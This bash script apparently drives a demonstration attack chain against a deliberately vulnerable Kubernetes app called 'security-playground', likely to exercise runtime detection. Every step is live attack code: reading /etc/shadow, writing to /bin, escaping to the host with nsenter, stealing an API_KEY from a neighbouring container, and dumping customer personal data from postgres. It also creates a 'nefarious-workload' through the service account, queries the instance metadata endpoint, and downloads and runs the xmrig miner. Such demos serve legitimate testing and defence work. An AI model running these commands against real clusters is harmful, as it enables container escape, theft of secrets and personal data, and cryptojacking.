#!/usr/bin/env bash
# Script to demonstrate how to interact with security-playground

NODE_IP=$(kubectl get nodes -o wide | awk 'FNR == 2 {print $6}')
NODE_PORT=30002
HELLO_NAMESPACE=hello

# Try to reach hello-server for our NetworkPolicy example later
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl http://hello-server.$HELLO_NAMESPACE.svc:8080" > /dev/null

echo "1. Read a sensitive file (/etc/shadow)"
echo "--------------------------------------------------------------------------------"
curl $NODE_IP:$NODE_PORT/etc/shadow
echo "--------------------------------------------------------------------------------"
sleep 10


echo "2. Exploit writing to /bin"
echo "--------------------------------------------------------------------------------"
curl -s -X POST $NODE_IP:$NODE_PORT/bin/hello -d 'content=echo "hello-world"'
echo ""
echo "and then set it to be executable"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 /bin/hello'
echo "and then run it"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=hello'
echo "--------------------------------------------------------------------------------"
sleep 10

echo "3. Install nmap from apt and then run a scan"
echo "--------------------------------------------------------------------------------"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'
echo "--------------------------------------------------------------------------------"
sleep 10

echo "4. Break out of our Linux namespace to the host's with nsenter and install crictl in /usr/bin"
echo "--------------------------------------------------------------------------------"
ARCH=$(curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=dpkg --print-architecture')
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.29.0/crictl-v1.29.0-linux-$ARCH.tar.gz"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 tar -zxvf crictl-v1.29.0-linux-$ARCH.tar.gz -C /usr/bin"
echo "--------------------------------------------------------------------------------"
sleep 10

echo "5. Break out of our Linux namespace to the host's with nsenter and talk directly to the container runtime"
echo "--------------------------------------------------------------------------------"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps'
echo "--------------------------------------------------------------------------------"
sleep 10

echo "6. Steal a secret from another container on the same Node (hello-client in the $HELLO_NAMESPACE Namespace)"
echo "--------------------------------------------------------------------------------"
HELLO_ID=$(curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name hello-client -q')
HELLO_ID_1=`echo "${HELLO_ID}" | head -1`
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $HELLO_ID_1 /bin/sh -c set" | grep API_KEY
echo "--------------------------------------------------------------------------------"
sleep 10

echo "7. Exfil some data from another container running on the same Node"
echo "--------------------------------------------------------------------------------"
POSTGRES_ID=$(curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name postgres-sakila -q')
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c 'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id)'"
echo "--------------------------------------------------------------------------------"
sleep 10

echo "8. Call the Kubernetes API via security-playground's K8s ServiceAccount"
echo "--------------------------------------------------------------------------------"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl -O https://s3.us-west-2.amazonaws.com/amazon-eks/1.28.3/2023-11-14/bin/linux/$ARCH/kubectl"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:070124'
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'
echo "--------------------------------------------------------------------------------"
sleep 10

echo "9. Call the Node's Instance Metadata Endpoint from the security-playground container"
echo "--------------------------------------------------------------------------------"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl http://169.254.169.254/latest/meta-data/iam/info'
echo "--------------------------------------------------------------------------------"
sleep 10

echo "10. Download and run a common crypto miner (xmrig)"
echo "--------------------------------------------------------------------------------"
if [[ "$ARCH" == "amd64" ]]; then
    curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz -O xmrig.tar.gz"    
else
    curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget https://z9k65lokhn70.s3.amazonaws.com/xmrig-6.20.0-linux-static-arm64.tar.gz -O xmrig.tar.gz"   
fi
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=xmrig-6.20.0/xmrig'